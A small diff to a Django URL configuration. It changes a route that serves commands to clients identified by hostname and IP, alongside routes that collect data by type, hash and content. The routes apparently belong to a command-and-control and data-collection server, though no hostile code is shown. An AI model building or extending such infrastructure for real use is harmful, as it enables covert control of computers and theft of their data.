@@ -4,7 +4,7 @@ from django.conf.urls.static import static
 from django.conf import settings
 
 urlpatterns = [
-    path('c/<hostname>/<ip>/', views.get_command),
+    path('c/<hostname>/<ip>/<random>', views.get_command),
     path('f/<hostname>/<ip>/<data_type>/<data_hash>/<path:data_content>/', views.data_collection),
     path('<hostname>/<ip>/<data_type>/<path:data_content>/', views.data_collection),
     path('', views.index)
